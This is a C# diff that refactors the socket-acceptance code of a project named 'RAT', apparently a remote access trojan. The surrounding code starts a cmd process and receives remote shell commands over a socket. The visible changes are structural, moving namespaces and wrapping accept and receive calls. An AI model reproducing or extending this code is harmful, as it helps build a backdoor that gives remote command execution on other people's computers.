@@ -5,7 +5,7 @@ using System;
 using System.Diagnostics;
 using System.Net.Sockets;
 
-namespace RAT.src.Sockets.Connection
+namespace RAT.src.Logic.Sockets.Connection
 {
     /// <summary>
     /// Logic related to connection acceptance stage.
@@ -33,10 +33,19 @@ namespace RAT.src.Sockets.Connection
         }
 
         /// <summary>
-        /// Socket receival logic handling. Is called as first one.
+        /// Wrapper for socket accept command.
+        /// </summary>
+        /// <param name="socket">Socket to accept connection on.</param>
+        public void BeginAccept(Socket socket)
+        {
+            socket.BeginAccept(OnInitialAccept, socket);
+        }
+
+        /// <summary>
+        /// Socket connection acceptance logic handling.
         /// </summary>
         /// <param name="res">Status of asynchronous operation.</param>
-        public void OnAccept(IAsyncResult res)
+        private void OnInitialAccept(IAsyncResult res)
         {
             // Signal the main thread to continue.
             ManualResetEventWrapper.ResetEvent.Set();
@@ -67,14 +76,8 @@ namespace RAT.src.Sockets.Connection
             clientState.ClientCmdProcess.BeginOutputReadLine();
             clientState.ClientCmdProcess.BeginErrorReadLine();
 
-            // We are ready to accept cmd commands.
-            handler.BeginReceive(
-                clientState.DataArray,
-                0,
-                clientState.DataArray.Length,
-                0,
-                _socketConnectionReceiveLogic.OnReceive,
-                clientState);
+            // We are ready to receive cmd commands.
+            _socketConnectionReceiveLogic.BeginCommandReceive(handler);
         }
     }
 }
